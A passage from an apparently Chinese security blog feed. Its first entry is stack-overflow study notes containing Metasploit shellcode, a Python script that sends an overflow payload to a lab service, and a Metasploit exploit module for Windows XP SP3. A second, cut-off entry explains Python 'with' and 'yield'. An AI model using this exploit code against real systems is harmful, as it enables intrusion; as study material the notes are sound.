class=&quot;line&quot;&gt;0x7c86467b jmp esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0x7c903015 push esp; retn 0x0353&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&quot;Metasploit-生成-shellcode&quot;&gt;&lt;a href=&quot;#Metasploit-生成-shellcode&quot; class=&quot;headerlink&quot; title=&quot;Metasploit 生成 shellcode&quot;&gt;&lt;/a&gt;Metasploit 生成 shellcode&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;msf &amp;gt; use payload/windows/exec &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msf payload(exec) &amp;gt; set cmd calc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cmd =&amp;gt; calc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msf payload(exec) &amp;gt; generate -b \x00\x03 -t python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# windows/exec - 213 bytes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# http://www.metasploit.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# Encoder: x86/countdown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# VERBOSE=false, PrependMigrate=false, EXITFUNC=process, &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# CMD=calc&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf =  &amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf += &amp;quot;\xa3\xa0\xae\xa0\xc4&amp;quot;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注：&lt;code&gt;\x00\x03&lt;/code&gt; 为坏字符，应过滤。&lt;/p&gt;
&lt;h4 id=&quot;构建溢出脚本&quot;&gt;&lt;a href=&quot;#构建溢出脚本&quot; class=&quot;headerlink&quot; title=&quot;构建溢出脚本&quot;&gt;&lt;/a&gt;构建溢出脚本&lt;/h4&gt;&lt;p&gt;将 buf、ret、shellcode进行拼接，发送给服务器：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;from socket import *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;host = &amp;quot;192.168.17.136&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;port = 7777&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;buf = &amp;quot;\x90&amp;quot; * 200&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ret = &amp;quot;\x7B\x46\x86\x7C&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode =  &amp;quot;&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;shellcode += &amp;quot;\xa3\xa0\xae\xa0\xc4&amp;quot;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sock = socket(AF_INET, SOCK_STREAM)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sock.connect((host, port))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sock.send(buf+ret+shellcode)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sock.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;执行后，成功弹出计算器，shellcode 已运行！&lt;br&gt;&lt;img src=&quot;/images/2014/12/06/stack-overflow-4.png&quot; alt=&quot;图 4&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;编写-Metasploit-模块&quot;&gt;&lt;a href=&quot;#编写-Metasploit-模块&quot; class=&quot;headerlink&quot; title=&quot;编写 Metasploit 模块&quot;&gt;&lt;/a&gt;编写 Metasploit 模块&lt;/h2&gt;&lt;p&gt;MSF 的框架化使得 exploit 的开发更加简单方便：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;require &amp;apos;msf/core&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class Metasploit3 &amp;lt; Msf::Exploit::Remote&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    include Exploit::Remote::Tcp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def initialize(info = &amp;#123;&amp;#125;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        super(update_info(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            info,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Name&amp;apos;          =&amp;gt; &amp;apos;test&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Version&amp;apos;       =&amp;gt; &amp;apos;1.0&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Platform&amp;apos;      =&amp;gt; &amp;apos;win&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Privileged&amp;apos;    =&amp;gt; true,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;License&amp;apos;       =&amp;gt; MSF_LICENSE,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Author&amp;apos;        =&amp;gt; &amp;apos;Chu&amp;apos;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Targets&amp;apos;       =&amp;gt; [&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [&amp;apos;Windows XP SP3&amp;apos;, &amp;#123;&amp;apos;Ret&amp;apos; =&amp;gt; 0x7C86467B &amp;#125;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            ],&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;DefaultTarget&amp;apos; =&amp;gt; 0,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;apos;Payload&amp;apos;       =&amp;gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;apos;Space&amp;apos;     =&amp;gt; 300,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;apos;BadChars&amp;apos;  =&amp;gt; &amp;quot;\x00&amp;quot;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    end&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def exploit&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        connect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        print_status(&amp;quot;Sending #&amp;#123;payload.encoded.length&amp;#125; byte payload...&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        attack_buf = &amp;apos;a&amp;apos;*200 + [target[&amp;apos;Ret&amp;apos;]].pack(&amp;apos;V&amp;apos;) + payload.encoded&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        sock.put(attack_buf)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        handler&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        disconnect&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    end&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;end&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2014/12/06/stack-overflow-5.png&quot; alt=&quot;图 5&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;《0day 安全 软件漏洞分析技术》&lt;/p&gt;
&lt;p&gt;感谢@糖果牛。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。&lt;/p&gt;
&lt;h2 id=&quot;基础概念&quot;&gt;&lt;a href=&quot;#基础概念&quot; class=&quot;headerlink&quot; title=&quot;基础概念&quot;&gt;&lt;/a&gt;基础概念&lt;/h2&gt;&lt;p&gt;1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。&lt;/li&gt;
&lt;li&gt;EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。
    
    </summary>
    
      <category term="Exploit" scheme="http://sh3ll.me/categories/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Python with &amp; yield</title>
    <link href="http://sh3ll.me/2014/08/13/python-with-yield/"/>
    <id>http://sh3ll.me/2014/08/13/python-with-yield/</id>
    <published>2014-08-13T05:22:46.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;h2 id=&quot;with&quot;&gt;&lt;a href=&quot;#with&quot; class=&quot;headerlink&quot; title=&quot;with&quot;&gt;&lt;/a&gt;with&lt;/h2&gt;&lt;p&gt;使用 with 语句操作文件对象&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;with open(&amp;quot;/etc/passwd&amp;quot;) as f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    for line in f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        print line&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;相当于：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;f = open(&amp;apos;/etc/passwd&amp;apos;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;try:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    for line in f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        print line&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;finally:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    f.close()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;yield&quot;&gt;&lt;a href=&quot;#yield&quot; class=&quot;headerlink&quot; title=&quot;yield&quot;&gt;&lt;/a&gt;yield&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;带有 yield 的函数在 Python 中被称之为 generator（生成器）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;支持 iterable 的 class：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;class Fab(object):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def __init__(self, max):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        self.max = max&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        self.n, self.a, self.b = 0, 0, 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def __iter__(self):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        return self&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def next(self):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        if self.n &amp;lt; self.max:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            r = self.b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            self.a, self.b = self.b, self.a + self.b&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            self.n = self.n + 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            return r&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        raise StopIteration()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;``` &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;使用 yield ：&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;def fab(max):&lt;br&gt;    n, a, b = 0, 0, 1&lt;br&gt;    while n &amp;lt; max:&lt;br&gt;        yield b&lt;br&gt;        a, b = b, a + b&lt;br&gt;        n = n + 1&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt; 简单地讲，yield 的作用就是把一个函数变成一个 generator，带有 yield 的函数不再是一个普通函数，Python 解释器会将其视为一个 generator，调用 fab(5) 不会执行 fab 函数，而是返回一个 iterable 对象！在 for 循环执行时，每次循环都会执行 fab 函数内部的代码，执行到 yield b 时，fab 函数就返回一个迭代值，下次迭代时，代码从 yield b 的下一条语句继续执行，而函数的本地变量看起来和上次中断执行前是完全一样的，于是函数继续执行，直到再次遇到 yield。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt; 一个带有 yield 的函数就是一个 generator，它和普通函数不同，生成一个 generator 看起来像函数调用，但不会执行任何函数代码，直到对其调用 next()（在 for 循环中会自动调用 next()）才开始执行。虽然执行流程仍按函数的流程执行，但每执行到一个 yield 语句就会中断，并返回一个迭代值，下次执行时从 yield 的下一个语句继续执行。看起来就好像一个函数在正常执行的过程中被 yield 中断了数次，每次中断都会通过 yield 返回当前的迭代值。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;gt; yield 的好处是显而易见的，把一个函数改写为一个 generator 就获得了迭代能力，比起用类的实例保存状态来计算下一个 next() 的值，不仅代码简洁，而且执行流程异常清晰。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;另一个 yield 的例子来源于文件读取。如果直接对文件对象调用 read() 